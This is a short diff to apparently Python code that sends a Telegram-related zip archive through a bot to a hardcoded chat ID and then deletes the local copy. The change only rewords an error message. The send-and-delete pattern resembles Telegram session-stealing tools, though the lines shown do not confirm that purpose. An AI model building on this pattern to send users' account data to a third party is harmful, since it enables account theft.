@@ -34,7 +34,7 @@ while telegram_online:
             os.remove(telegram_zip)
             break
         except Exception as e:
-            bot.send_message(MY_ID, f"🟠 Failed to send {telegram_zip} archive: {e}.")
+            bot.send_message(MY_ID, f"🟠 Failed to send {telegram_zip} archive. Error: {e}")
             pass
         telegram_online = False
     except Exception as e:
